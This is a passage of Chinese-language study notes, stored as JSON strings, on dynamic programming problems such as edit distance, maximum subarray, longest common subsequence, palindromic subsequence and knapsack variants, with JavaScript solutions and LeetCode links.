'' ,所以 s1 变成 s2 的最小编辑距离就是 s2 的长度,\n    //  即一直插入\n    if (i === -1) return j + 1;\n    // :::: 即 s2 = '' ,所以 s1 变成 s2 的最小编辑距离就是 s1 的长度，\n    //  即一直删除\n    if (j === -1) return i + 1;\n\n    // memo[i][j] 已经计算过\n    if (memo[`${i}-${j}`] !== undefined) return memo[`${i}-${j}`];\n\n    // skip, 所以 i-1, j-1\n    if (s1[i] === s2[j]) {\n        return memo[`${i}-${j}`] = dp(s1, i - 1, s2, j - 1, memo);\n    }\n    return memo[`${i}-${j}`] = Math.min(\n        // 插入, s1[i] 插入到 s2[j] 前面, 所以 j-1\n        dp(s1, i, s2, j - 1, memo) + 1,\n        // 删除，s1[i] 删除，所以 i-1\n        dp(s1, i - 1, s2, j, memo) + 1,\n        // 替换, s2[j] 替换为 s1[i], 所以 i-1, j-1\n        dp(s1, i - 1, s2, j - 1, memo) + 1\n    );\n};\n\nconsole.log(minDistance('horse', 'ros'));\nconsole.log(minDistance('intention', 'execution'));\n```\n\n> [!danger]\n注意：一点要在所有需要赋值给 `memo` 的地方赋值，搞了半天，发现少了赋值了\n\n> [!info]\n如果说 `memo` 为`对象`时，可以少了初始化工作，如果是`数组`时，初始化数组时，其实保证二维数组长度和宽度**大一点也没关系**。\n\n\n## 至底向上的 dp table 解法\n\n![|632](https://832-1310531898.cos.ap-beijing.myqcloud.com/07695c5c20b4168dbaa64e0a984c3eb9.png)\n> \n> [!warning]\n`dp 函数`的 base case 是 i, j 等于 `-1`，而 **dp数组索引至少是 0**，所以 dp 数组会偏移一位。\n\n代码如下：\n\n```javascript\nlet minDistance = function (s1, s2) {\n    let m = s1.length, n = s2.length;\n    // 定义：s1[0..i] 和 s2[0..j] 的最小编辑距离是 dp[i+1][j+1]\n    let dp = [];\n    for (let i = 0; i <= m; i++) {\n        dp[i] = new Array(n + 1).fill(0);\n    }\n    // base case\n    // ::::即 s2 = '' \n    for (let i = 1; i <= m; i++) {\n        dp[i][0] = i;\n    }\n    // ::::即 s1 = ''\n    for (let j = 1; j <= n; j++) {\n        dp[0][j] = j;\n    }\n    // 自底向上求解\n    for (let i = 1; i <= m; i++) {\n        for (let j = 1; j <= n; j++) {\n            if (s1[i - 1] === s2[j - 1]) {\n                dp[i][j] = dp[i - 1][j - 1];\n            } else {\n                dp[i][j] = Math.min(\n                    dp[i - 1][j] + 1,\n                    dp[i][j - 1] + 1,\n                    dp[i - 1][j - 1] + 1\n                );\n            }\n        }\n    }\n    // 储存着整个 s1 和 s2 的最小编辑距离\n    return dp[m][n];\n};\n```\n\n> [!failure]\n其实，dp数组，保证开始索引`大于 0`，`最大等于 length + 1` 即能保证范围正常，虽然大一点也行\n\n\n## 空间复杂度压缩成 `O(min(M, N))`\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/9208e921f753e3b70a2a30c144931263.png)\n\n如上图，既然每个 `dp[i][j]` 只和它附近的三个状态有关，`空间复杂度`是可以压缩成 `O(min(M, N))` 的（`M`，`N` 是两个字符串的长度）\n数据结构构造如下：\n\n```javascript\nfunction Node() {\n    this.val = 0;\n    this.choice = 0; // 0 代表啥都不做\n                     // 1 代表插入\n                     // 2 代表删除\n                     // 3 代表替换\n}\n```\n\n`val` 属性就是之前的 `dp 数组`的数值，`choice` 属性代表操作。在做最优选择时，顺便把操作记录下来，然后就从结果反推具体操作。\n我们的最终结果不是 `dp[m][n]` 吗，这里的 `val` 存着`最小编辑距离`，choice 存着`最后一个操作`，比如说是`插入操作`，那么就可以`左移一格`\n最终，到 `dp[0][0]`，如下图这样：\n\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/418ac76556402886b7105d0d45974274.png)\n\n\n> 具体实现不展开，点到为止！\n\n\n## 最后\n\n- 这个题主要是`倒着遍历`\n- 还是`递归备忘录`，不容易写出问题，dp 数组细节比较多\n- 最后，还有个思路是如何`压缩空间复杂度`，取决于状态如何转移？ 很多动态规划的问题都可以压缩空间复杂度\n","9O1kR3Ph":"\n# 子序列：最大子数组\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![图片&文件](./files/20241111-6.png)\n\n## 2. 解法一：滑动窗口解法\n\n- 在窗口内元素之和`大于等于 0 时`扩大窗口\n- 在窗口内元素之和`小于 0 时`缩小窗口\n- 在每次移动窗口时更新答案\n\n请问：有正数有负数为什么也能得到正确答案？\n\n```javascript hl:23\n/**\n * @description 最大子数组和，滑动窗口思路\n * @param {number[]} nums\n * @return {number} 返回最大子数组和\n */\nvar maxSubArray = function (nums) {\n  // 题设中的最小值\n  let res = -10000 * 100000;\n  // ①  初始化左指针，右指针，窗口内元素的和\n  let left = 0; // 左指针\n  let right = 0; // 右指针\n  let windowSum = 0; // 窗口内元素的和\n\n  // ②  遍历，使用滑动窗口思路\n  while (right < nums.length) {\n    // ③  更新 windowSum\n    windowSum += nums[right];\n    // ④  更新右指针\n    right++;\n    // ⑤  更新结果\n    res = Math.max(res, windowSum);\n    // ⑥  判断是否需要收缩左指针\n    // 如果 windowSum 小于 0，说明 windowSum 对结果是减少的，需要收缩左指针\n    while (windowSum < 0) {\n      // ⑦  更新 windowSum\n      windowSum -= nums[left];\n      left++;\n    }\n  }\n\n  return res;\n};\n\n```\n\n## 3. 解法二：动态规划解法\n\n以 `nums[i]` 为**结尾**的「最大子数组和」为 `dp[i]`\n\n`dp[i]` 有两种「选择」\n- 要么与前面的相邻子数组连接，形成一个和更大的子数组；\n- 要么不与前面的子数组连接，自成一派，自己作为一个子数组\n\n```javascript\nvar maxSubArray = function (nums) {\n  var n = nums.length;\n  if (n === 0) return 0;\n  // 定义：dp[i] 记录以 nums[i] 为结尾的「最大子数组和」\n  var dp = new Array(n);\n  // base case\n  // 第一个元素前面没有子数组\n  dp[0] = nums[0];\n  // 状态转移方程\n  for (var i = 1; i < n; i++) {\n    dp[i] = Math.max(nums[i], nums[i] + dp[i - 1]);\n  }\n  // 得到 nums 的最大子数组\n  var res = -Infinity;\n  for (var i = 0; i < n; i++) {\n    res = Math.max(res, dp[i]);\n  }\n  return res;\n};\n\n```\n\n> 还可以进一步压缩空间，略！\n\n## 4. 解法三：前缀和思路\n\n```javascript\n// 前缀和技巧解题\nvar maxSubArray = function (nums) {\n  var n = nums.length;\n  var preSum = new Array(n + 1).fill(0);\n  preSum[0] = 0;\n  // 构造 nums 的前缀和数组\n  for (var i = 1; i <= n; i++) {\n    preSum[i] = preSum[i - 1] + nums[i - 1];\n  }\n\n  var res = Number.NEGATIVE_INFINITY;\n  var minVal = Number.POSITIVE_INFINITY;\n  for (var i = 0; i < n; i++) {\n    // 维护 minVal 是 preSum[0..i] 的最小值\n    minVal = Math.min(minVal, preSum[i]);\n    // 以 nums[i] 结尾的最大子数组和就是 preSum[i+1] - min(preSum[0..i])\n    res = Math.max(res, preSum[i + 1] - minVal);\n  }\n  return res;\n};\n\n```\n\n","17LB2qdP":"\n# 子序列：最长公共子序列问题\n\n`#算法/动态规划` \n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[583. Delete Operation for Two Strings](https://leetcode.com/problems/delete-operation-for-two-strings/)|[583. 两个字符串的删除操作](https://leetcode.cn/problems/delete-operation-for-two-strings/)|🟠|\n|[712. Minimum ASCII Delete Sum for Two Strings](https://leetcode.com/problems/minimum-ascii-delete-sum-for-two-strings/)|[712. 两个字符串的最小ASCII删除和](https://leetcode.cn/problems/minimum-ascii-delete-sum-for-two-strings/)|🟠|\n|[1143. Longest Common Subsequence](https://leetcode.com/problems/longest-common-subsequence/)|[1143. 最长公共子序列](https://leetcode.cn/problems/longest-common-subsequence/)|🟠|\n\n## 目录\n<!-- toc -->\n ## 1. 最长公共子序列 \n\n![图片&文件](./files/20241111-7.png)\n\n> https://leetcode.cn/problems/longest-common-subsequence/description/\n\n比如说输入 `s1 = \"zabcde\", s2 = \"acez\"`，它俩的最长公共子序列是 `lcs = \"ace\"`，长度为 3，所以算法返回 3。\n\n### 1.1. dp 函数定义\n\n```javascript\n// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度\nvar dp = function(s1, i, s2, j) {\n\n};\n```\n\n- 根据这个 `dp` 函数的定义，那么我们想要的答案就是 `dp(s1, 0, s2, 0)`\n- 且 base case 就是 `i == len(s1)` 或 `j == len(s2)` 时，因为这时候 `s1[i..]` 或 `s2[j..]` 就相当于空串了，最长公共子序列的长度显然是 0\n\n```javascript\n// 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度\nvar dp = function(s1, i, s2, j) {\n    if (s1.charAt(i) == s2.charAt(j)) {\n       // s1[i] 和 s2[j] 必然在 lcs 中， \n       // 加上 s1[i+1..] 和 s2[j+1..] 中的 lcs 长度，就是答案\n        return 1 + dp(s1, i + 1, s2, j + 1);\n    } else {\n        // s1[i] 和 s2[j] 中至少有一个字符不在 lcs 中，\n        // 穷举三种情况的结果，取其中的最大结果\n        return Math.max(\n            // 情况一、s1[i] 不在 lcs 中\n            dp(s1, i + 1, s2, j),\n            // 情况二、s2[j] 不在 lcs 中\n            dp(s1, i, s2, j + 1),\n            // 情况三、都不在 lcs 中\n            dp(s1, i + 1, s2, j + 1)\n        );\n    }\n};\n```\n\n### 1.2. 最终代码\n\n```javascript hl:9,41\nvar longestCommonSubsequence = function (s1, s2) {\n  // 备忘录，消除重叠子问题\n  let memo = [];\n\n  // 主函数\n  const m = s1.length,\n    n = s2.length;\n  // 备忘录值为 -1 代表未曾计算\n  // 初始化二维数组 memo,直接使用 for吧，别用其他的了\n  // 这样不容易出错\n  for (let i = 0; i < m; i++) {\n    memo[i] = [];\n    for (let j = 0; j < n; j++) {\n      memo[i][j] = -1;\n    }\n  }\n\n  // 计算 s1[0..] 和 s2[0..] 的 lcs 长度\n  return dp(s1, 0, s2, 0);\n\n  // 定义：计算 s1[i..] 和 s2[j..] 的最长公共子序列长度\n  function dp(s1, i, s2, j) {\n    // base case：任何一个字符串到头了，返回 0\n    // 因为这个时候，lcs 的长度是空字符串\n    if (i === s1.length || j === s2.length) {\n      return 0;\n    }\n    // 如果之前计算过，则直接返回备忘录中的答案\n    if (memo[i][j] !== -1) {\n      return memo[i][j];\n    }\n    // 根据 s1[i] 和 s2[j] 的情况做选择\n    if (s1.charAt(i) === s2.charAt(j)) {\n      // s1[i] 和 s2[j] 必然在 lcs 中\n      memo[i][j] = 1 + dp(s1, i + 1, s2, j + 1);\n    } else {\n      // s1[i] 和 s2[j] 至少有一个不在 lcs 中\n      memo[i][j] = Math.max(\n        dp(s1, i + 1, s2, j), // 情况一： s2[j] 不在 lcs 中\n        dp(s1, i, s2, j + 1), // 情况二： s1[i] 不在 lcs 中\n        // dp(s1, i + 1, s2, j + 1), // 情况三： 都不在 lcs 中\n      );\n    }\n    return memo[i][j];\n  }\n};\n\n```\n\n> 情况三可以注释掉，因为被 情况一 和 情况二包含了\n\n## 2. 两个字符串同时删除后相等，最少需要几步？\n\n![图片&文件](./files/20241111-8.png)\n\n删除的结果不就是它俩的`最长公共子序列`嘛，\n\n那么，要计算删除的次数，就可以通过最长公共子序列的长度**推导**出来：\n\n```javascript hl:4\nvar minDistance = function(s1, s2) {\n    var m = s1.length, n = s2.length;\n    // 复用前文计算 lcs 长度的函数\n    var lcs = longestCommonSubsequence(s1, s2);\n    return m - lcs + n - lcs;\n};\n```\n\n## 3. 使两个字符串相等所需删除字符的 `ASCII 值`的最小和\n\n![图片&文件](./files/20241111-9.png)\n\n比如输入 `s1 = \"sea\", s2 = \"eat\"`，算法返回 231。\n- 因为在 `\"sea\"` 中删除 `\"s\"`\n- 在 `\"eat\"` 中删除 `\"t\"`，可使得两个字符串相等，且**删掉字符的 ASCII 码之和最小**\n\t- 即 `s(115) + t(116) = 231`\n\n### 3.1. dp 函数定义\n\n```javascript\n  // 定义：将 s1[i..] 和 s2[j..] 删除成相同字符串，\n  // 最小的 ASCII 码之和为 dp(s1, i, s2, j)。\n  function dp(s1, i, s2, j) {\n  \n  }\n```\n\n### 3.2. 代码实现\n\n```javascript hl:19,26,43\nvar minimumDeleteSum = function (s1, s2) {\n  // 备忘录\n  let memo = [];\n  const m = s1.length,\n    n = s2.length;\n  // 备忘录值为 -1 代表未曾计算\n  for (let i = 0; i < m; i++) {\n    memo.push(new Array(n).fill(-1));\n  }\n  // 定义：将 s1[i..] 和 s2[j..] 删除成相同字符串，\n  // 最小的 ASCII 码之和为 dp(s1, i, s2, j)。\n  function dp(s1, i, s2, j) {\n    let res = 0;\n    // base case start:\n    // 如果一个字符串到头了, 另一个字符串的所有字符都得删除\n    // ASCII 码之和就是删除的字符 ASCII 码之和\n    if (i === s1.length) {\n      // 如果 s1 到头了，那么 s2 剩下的都得删除\n      for (; j < s2.length; j++) {\n        res += s2.charCodeAt(j);\n      }\n      return res;\n    }\n    if (j === s2.length) {\n      // 如果 s2 到头了，那么 s1 剩下的都得删除\n      for (; i < s1.length; i++) {\n        res += s1.charCodeAt(i);\n      }\n      return res;\n    }\n    // base case end\n    if (memo[i][j] !== -1) {\n      return memo[i][j];\n    }\n    if (s1.charAt(i) === s2.charAt(j)) {\n      // s1[i] 和 s2[j] 都是在 lcs 中的，不用删除\n      memo[i][j] = dp(s1, i + 1, s2, j + 1);\n    } else {\n      // s1[i] 和 s2[j] 至少有一个不在 lcs 中，删一个\n      memo[i][j] = Math.min(\n        s1.charCodeAt(i) + dp(s1, i + 1, s2, j),\n        s2.charCodeAt(j) + dp(s1, i, s2, j + 1),\n      );\n    }\n    return memo[i][j];\n  }\n  return dp(s1, 0, s2, 0);\n};\n```\n\n","nB628VDN":"\n# 子序列： 动态规划之子序列问题解题模板（最长回文子序列）\n\n\n| LeetCode                                                                                                                                        | 力扣                                                                                                          | 难度  |\n| ----------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | --- |\n| [1312. Minimum Insertion Steps to Make a String Palindrome](https://leetcode.com/problems/minimum-insertion-steps-to-make-a-string-palindrome/) | [1312. 让字符串成为回文串的最少插入次数](https://leetcode.cn/problems/minimum-insertion-steps-to-make-a-string-palindrome/) | 🔴  |\n| [516. Longest Palindromic Subsequence](https://leetcode.com/problems/longest-palindromic-subsequence/)                                          | [516. 最长回文子序列](https://leetcode.cn/problems/longest-palindromic-subsequence/)                               | 🟠  |\n\n## 目录\n<!-- toc -->\n ## 1. 子序列不好解决 \n\n- 子序列问题本身就相对子串、子数组更困难一些\n\t- 因为序子序列是不连续的\n\n## 2. 两种解题模板\n\n### 2.1. 一维 dp 数组\n\n定义：在子数组 `arr[0..i]` 中，以 `arr[i]` **结尾**的子序列的长度是 `dp[i]`\n\n这样符合**归纳法**，可以找到**状态转移**的关系\n\n```javascript hl:5\nint n = array.length;\nint[] dp = new int[n];\n\nfor (int i = 1; i < n; i++) {\n    for (int j = 0; j < i; j++) {\n        dp[i] = 最值(dp[i], dp[j] + ...)\n    }\n}\n```\n\n> 注意是上面标注的 `j < i`\n\n### 2.2. 二维的 `dp` 数组\n\n这种思路运用相对更多一些\n- 尤其是涉及**两个字符串/数组的子序列**时\n\t- 在子数组 `arr1[0..i]` 和子数组 `arr2[0..j]` 中，我们要求的子序列长度为 `dp[i][j]`\n\t\t- 注意上面的 `i 和 j` 分别代表什么？\n- 也可以用于只涉及**一个字符串/数组**的情景，比如回文子序列问题\n\t- 在子数组 `array[i..j]` 中，我们要求的子序列的长度为 `dp[i][j]`\n\t\t- 注意上面的 `i 和 j` 分别代表什么？\n\n## 3. 最长回文子序列\n\n![图片&文件](./files/20241111-10.png)\n\n比如说输入 `s = \"aecda\"`，算法返回 3，因为最长回文子序列是 `\"aca\"`，长度为 3。\n### 3.1. dp 数组定义\n\n `dp` 数组的定义是：\n - 在子串 `s[i..j]` 中，最长回文子序列的长度为 `dp[i][j]`\n\n```javascript\nif (s[i] == s[j])\n    // 它俩一定在最长回文子序列中\n    dp[i][j] = dp[i + 1][j - 1] + 2;\nelse\n    // s[i+1..j] 和 s[i..j-1] 谁的回文子序列更长？\n    dp[i][j] = max(\n\t    dp[i + 1][j], \n\t    dp[i][j - 1]\n    );\n```\n\n### 3.2. 为什么是 `dp[i][j] = dp[i + 1][j - 1]` \n\n![图片&文件](./files/20241111-13.png)\n\n如上图，如果 `i=j` ，那么就可以\n- i 指针向右移动，i + 1\n- j 指针向左移动，j - 1\n\n### 3.3. 遍历顺序\n\n![图片&文件](./files/20241111-11.png)\n### 3.4. 最终代码\n\n```javascript\nvar longestPalindromeSubseq = function (s) {\n  var n = s.length;\n  // dp 数组全部初始化为 0\n  var dp = Array.from({ length: n }, () => Array(n).fill(0));\n  // base case：i 和 j 相等的话 dp[i][j] 必然等于 1\n  // 为什么：因为此时 s[i..j] 只有一个字符，那就是它自己\n  for (var i = 0; i < n; i++) {\n    dp[i][i] = 1;\n  }\n  // 反着遍历保证正确的状态转移\n  // 因为 dp[i][j] 依赖 dp[i + 1][j - 1]，需要知道 dp[i + 1][j - 1] 才能算出 dp[i][j]\n  for (var i = n - 1; i >= 0; i--) {\n    // j 从 i + 1 开始,因为 dp[i][j] 是从 dp[i + 1][j - 1] 转移过来的\n    for (var j = i + 1; j < n; j++) {\n      // 状态转移方程\n      if (s.charAt(i) == s.charAt(j)) {\n        // s[i] 和 s[j] 必然在最长回文子序列中，直接 +2\n        dp[i][j] = dp[i + 1][j - 1] + 2;\n      } else {\n        dp[i][j] = Math.max(\n          dp[i + 1][j], // s[i] 不在最长回文子序列中\n          dp[i][j - 1], // s[j] 不在最长回文子序列中\n        );\n      }\n    }\n  }\n  // 整个 s 的最长回文子串长度\n  return dp[0][n - 1];\n};\n```\n\n## 4. 让字符串成为回文串的最少插入次数\n\n![图片&文件](./files/20241111-12.png)\n\n- 比如说输入 `s = \"abcea\"`，算法返回 2，因为可以给 `s` 插入 2 个字符 `ba` 变成回文串 `\"abeceba\"` 或者 `\"aebcbea\"`。\n- 如果输入 `s = \"aba\"`，则算法返回 0，因为 `s` 已经是回文串，不用插入任何字符\n\n### 4.1. dp 定义\n\n对字符串 `s[i..j]`，最少需要进行 `dp[i][j]` 次插入才能变成回文串\n\n```javascript hl:3\nif (s[i] == s[j]) {\n    // 不需要插入任何字符\n    dp[i][j] = dp[i + 1][j - 1];\n} else {\n    // 把 s[i+1..j] 和 s[i..j-1] 变成回文串，选插入次数较少的\n    // 然后还要再插入一个 s[i] 或 s[j]，使 s[i..j] 配成回文串\n    dp[i][j] = min(\n\t    dp[i + 1][j],  // 再插入一个 s[i]\n\t    dp[i][j - 1]   // 再插入一个 s[j]\n\t) + 1;\n}\n```\n\n### 4.2. 最终代码\n\n```javascript\nvar minInsertions = function (s) {\n  var n = s.length;\n  // dp[i][j] 表示把字符串 s[i..j] 变成回文串的最少插入次数\n  // dp 数组全部初始化为 0\n  var dp = Array.from(Array(n), () => Array(n).fill(0));\n  // 反着遍历保证正确的状态转移\n  for (var i = n - 1; i >= 0; i--) {\n    for (var j = i + 1; j < n; j++) {\n      // 状态转移方程\n      // 如果 s[i] == s[j]，说明不用插入，dp[i][j] = dp[i + 1][j - 1]\n      if (s.charAt(i) === s.charAt(j)) {\n        dp[i][j] = dp[i + 1][j - 1];\n      } else {\n        dp[i][j] =\n          Math.min(\n            dp[i + 1][j], // 插入 s[i]，使得 s[i,j] 变成回文串\n            dp[i][j - 1], // 插入 s[j]，使得 s[i,j] 变成回文串\n          ) + 1;\n      }\n    }\n  }\n  // 整个 s 的最少插入次数\n  return dp[0][n - 1];\n};\n\n```\n\n### 4.3. 复用最长回文子序列的代码\n\n```javascript hl:2\nvar minInsertions = function(s) {\n    return s.length - longestPalindromeSubseq(s);\n};\n\n// 计算 s 中的最长回文子序列长度\nvar longestPalindromeSubseq = function(s) {\n    // 见上文\n};\n```\n\n","snJzhHIb":"\n# 背包：0-1 背包问题\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/eb326f45af47c14e2417fcafa7d685ef.png)\n\n![image.png|464](https://832-1310531898.cos.ap-beijing.myqcloud.com/b3d4ee3af6a14a7325c4cc7d902898b3.png)\n\n举例说明：\n\n- `N = 3` 表示可选择的物品有 `三件`\n- `W = 4`  表示包能装 `4kg` 的物品\n- `wt = [2, 1, 3]`  表示每件物品的重量\n- `val = [4, 2, 3]` 表示每件物品的价值\n\n那么最大价值是：选择前两个物品，因为最大价值是 6 \n\n## 明确 `状态` 与 `选择`\n\n状态， 即什么在变化？，有两个**状态\n- 包还能装多少？\n- 还可选择的物品\n\n**选择**，对于一个物品，你装还是不装？\n- 装\n- 不装\n\n## 明确 `dp数组` 的定义\n\n- 状态有多少个，决定 `dp数组` 是 `几维`数组\n- `dp[i][w]` 的定义如下：\n   - 对于前 `i` 个物品，`当前背包的 剩余 容量` 为 `w`， 这种情况下可以装的最大价值是 `dp[i][w]`\n   - `dp[3][5] = 6`，其含义为：\n      - 对于给定的一系列物品中，若只对`前 3 个物品`进行选择，当背包剩余容量为 `5` 时，最多可以装下的价值为 `6`\n- 所以\n   - base case：\n      - `dp[i][0] = 0 `， `dp[0][w] = 0` \n      - 根据一定规则（`状态转移方程`）\n   -   推导出  =>   `dp[N][W]` 即是所要求的值\n\n## 根据`动态规划框架` 写出 此题的`伪码` \n\n```javascript\n// base case：\ndp[0][...] = base case\n\n// 根据状态的个数，嵌套遍历：\nfor 状态1 in 状态1的所有取值：\n    for 状态2 in 状态2的所有取值：\n        for ...\n            dp[状态1][状态2][...] = 择优(选择1，选择2...)\n```\n\n```javascript\n// 初始化 二维 dp 数组\ndp[N+1][W+1]\n\n// base case : 无论哪个指标为 0，dp 数组都为 0\ndp[0][..] = 0\ndp[..][0] = 0\n\n// 根据状态，嵌套遍历，下标从 1 开始，=>  推导出 dp[N][W]\nfor i in [1..N]:\n    for w in [1..W]:\n        dp[i][w] = max(\n            把物品 i 装进背包,\n            不把物品 i 装进背包\n        )\n\nreturn dp[N][W]\n```\n\n对于 `dp[i][w]` ，来自于两个选择\n\n- 选择一： 第 `i` 物品不装入\n\t- `dp[i][w]`  =   剩余重量为 `w` 的包选择前 `i-1` 个物品的价值，即`dp[i-1][w]` \n- 选择二： 第 `i` 个物品装入\n\t- `dp[i][w]`  =   \n\t\t- 在剩余重量为 `w - wt[i-1]`限制下， 选择装前 `i-1` 个物品的价值  +   第 `i` 个物品的价值 `val[i]` ，即\n\t\t- `dp[i-1][w - wt[i-1]]`  + `val[i-1]`\n\n> 数组索引问题导致的误解：\n> - 因为数组索引问题： `val[i-1]` 和  `wt[i-1]` 表示第 `i` 个物品的价值和重量\n> \n> 所以对于第 `i` 个物品，我们选择装入，也就是说前`i-1` 个物品，只能装到 `剩余重量` 为 `w - wt[i-1]` ，即 `dp[i-1][w-[w-1]`\n\n## 最终代码\n```javascript\n/**\n* @description 0/1 Knapsack Problem\n* */\nfunction fn(N, W, wt, val) {\n    // ::::1、初始化dp数组\n    const dp = [];\n    for (let i = 0; i <= N; i++) {\n        dp[i] = [];\n        for (let j = 0; j <= W; j++) {\n            dp[i][j] = 0;\n        }\n    }\n    // ::::2、base case\n    for (let i = 0; i <= N; i++) {\n        dp[i][0] = 0;\n    }\n    for (let i = 0; i <= W; i++) {\n        dp[0][i] = 0;\n    }\n    // ::::3、动态规划框架，根据状态个数，决定嵌套层数\n    for (let i = 1; i <= N; i++) {\n        for (let w = 1; w <= W; w++) {\n            // 剩余容量已经小于 0 了，只能选择不装入\n            if (w - wt[i - 1] < 0) {\n                dp[i][w] = dp[i - 1][w];\n            } else {\n                // 选择：装入 或者 不装入\n                dp[i][w] = Math.max(\n                    // 不装入\n                    dp[i - 1][w],\n                    // 装入\n                    dp[i - 1][w - wt[i - 1]] + val[i - 1]\n                )\n            }\n        }\n    }\n    console.log(dp)\n    return dp[N][W];\n}\n\n// const N = 3, W = 4,\n//     wt = [2, 1, 3],\n//     val = [4, 2, 3];\nconst N = 5, W = 50,\n    wt = [10, 20, 30, 40, 50],\n    val = [50, 120, 150, 210, 240];\n\nconsole.log(fn(N, W, wt, val));\n\n```\n\n## 错误记录\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/d012e8b84c3fd6834fedff33acd4144c.png)\n\n-  需要 从 `1` 开始遍历\n- 注意两个变量 `w` 和 `wt` 别搞混了\n\n","V9qs0d5D":"\n# 背包：数组是否可以分割两个子集，使得这两子集的元素和相等\n\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n> [力扣（LeetCode）](https://leetcode.cn/problems/partition-equal-subset-sum/description/)\n\n![image.png|656](https://832-1310531898.cos.ap-beijing.myqcloud.com/04774a23f90d397bbb8af286c8b1cde9.png)\n\n## 题解\n\n这道题是  [14. 背包：0-1 背包问题](/post/snJzhHIb.html) 的变种：\n\n- 给一个可装载重量为 `sum / 2 ` 的背包和 `N` 个物品，每个物品的重量为`nums[i]`。现在让你装物品，是否存在一种装法，能够恰好将背包装满。\n\n## 明确 `状态` 和 `选择`\n\n**状态：**\n- 背包还能装多少重量的物品\n- 还能选择的物品\n**选择：**\n- `装`进背包\n- `不装`进背包\n\n## 明确 `dp数组` 的定义\n\n###  定义\n\n`dp[i][w] = x` 表示：\n- 对于前 `i` 个物品（ i 从 1 开始计数），当前背包的容量为 `w` 时，是否能装满背包\n   - 若 `x` 为 `true`，则说明 `可以`恰好将背包`装满`\n   - 若 `x` 为 `false`，则说明`不能`恰好将背包`装满`\n\n\n> 所以，本题的题解就是求：`dp[N][sum/2]`\n\n### base case\n\n- `dp[...][0] = true` ，表示没有容量，`装满了`\n- `dp[0][...]= false` ，表示没有可选择的物品，`不能装满`\n\n## 根据 `选择` 确定 `状态转移方程`\n\n### 1. 选择一：不选\n\n```javascript\ndp[i][w] = dp[i-1][w]\n```\n\n解释：\n\n> 你不把第`i` 装入包中时，`是否装满`只取决于 `前 i-1 个物品` 是否装满剩余容量为 `w` 的背包\n\n### 2. 选择二：选择\n\n```javascript\ndp[i][w] = dp[i-1][w-num[i-1]]\n```\n\n解释：\n\n> 你把第`i` 装入包中时，`是否装满`只取决于 `前 i-1 个物品` 是否装满剩余容量为 `w - num[i-1]` 的背包\n> \n> 换句话说，如果 `w - nums[i-1]` 的 重量可以被恰好装满，那么只要把第 `i` 个物品**能装进去**，也可恰好装满 `w` 的重量\n\n## 根据 `动态规划框架` 写出 `最终代码`\n\n```javascript hl:9\n/**\n * @description 分割等和子集, 0/1背包的变种\n * @url https://leetcode-cn.com/problems/partition-equal-subset-sum/\n * @param {number} N\n * @param {number} W\n * @param {number[]} wt\n * */\nfunction fn(N, W, wt) {\n    // :::: 初始化dp数组 及其 base case\n    const dp = [];\n    for (let i = 0; i <= N; i++) {\n        dp[i] = [];\n        for (let w = 0; w <= W; w++) {\n            // ::::重量为0时，表示能够装入\n            if (w === 0) {\n                dp[i][w] = true;\n            }\n            // ::::可选择的物品为0时，表示不能装入\n            else if (i === 0) {\n                dp[i][w] = false;\n            }\n            // ::::其余情况，初始化为false\n            else {\n                dp[i][w] = false;\n            }\n        }\n    }\n    // ::::根据状态个数，决定嵌套层数，\n    // ::::使用动态规划框架模板代码遍历\n    for (let i = 1; i <= N; i++) {\n        for (let w = 1; w <= W; w++) {\n            // ::::剩余容量已经小于 0 了，只能取决于上一个物品的状态，是否装满了\n            if (w - wt[i - 1] < 0) {\n                dp[i][w] = dp[i - 1][w];\n            } else {\n                // ::::选择\n                dp[i][w] =\n                    // ::::不装入\n                    dp[i - 1][w] ||\n                    // ::::装入\n                    dp[i - 1][w - wt[i - 1]];\n            }\n        }\n    }\n    return dp[N][W];\n}\n\n\n/**\n * @param {number[]} nums\n * @return {boolean}\n */\nvar canPartition = function (nums) {\n    const sum = nums.reduce((a, b) => a + b, 0);\n    // ::::如果总和为奇数，直接返回false\n    if (sum % 2 !== 0) return false;\n    // ::::背包容量\n    const W = sum / 2;\n    // ::::物品数量\n    const N = nums.length;\n    return fn(N, W, nums);\n};\n\n```\n\n## 优化空间复杂度\n\n```javascript\nvar canPartition = function (nums) {\n    let W = 0;\n    for (let num of nums) W += num;\n    // 和为奇数时，不可能划分成两个和相等的集合\n    if (W % 2 !== 0) return false;\n    let N = nums.length;\n    W = W / 2;\n\n    let dp = new Array(W + 1).fill(false);\n\n    // base case\n    dp[0] = true;\n\n    for (let i = 0; i < N; i++) {\n        // ::::: 从后往前遍历\n        for (let w = W; w >= 0; w--) {\n            if (w - nums[i] >= 0) {\n                dp[w] = dp[w] || dp[w - nums[i]];\n            }\n        }\n    }\n    return dp[W];\n};\n```\n\n时间复杂度 `O(n*sum)`，空间复杂度 `O(sum)`\n\n> - 注意是`倒序`，记住正常的解法就行，这种压缩空间复杂度的解法，还没理解透\n\n\n","yRYqPpbd":"\n# 完全背包问题：零钱兑换\n\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/0325474c4e8392cb53b049cbb6a6ce07.png)\n\n## 题解：背包问题的变种\n\n有一个背包，最大容量为 `amount`，有一系列物品 `coins`，每个物品的重量为 `coins[i]`，每个物品的**数量无限**。请问有`多少种`方法，能够把背包恰好装满？\n\n> 每个物品的数量是无限，所以叫做 **完全背包问题\n\n## 三、明确`状态`与`选择`\n\n### 状态\n\n- `背包的剩余容量`，即还能装多少重量的物件\n- 可选择的物品\n\n### 选择\n\n- 选择`放入`背包\n- 选择`不放入`背包\n\n## 明确 `dp 数组`的定义\n\n\n`dp[i][w]` 的定义如下：\n\n背包变种的解释：\n- 若只使用`前 i 个物品`（可以重复使用），当背包剩余容量为`w` 时，有 `dp[i][w]` 种方法可以`装满`背包\n回到原题：\n- 若只使用 `coins` 中的`前 i 个`（i 从 1 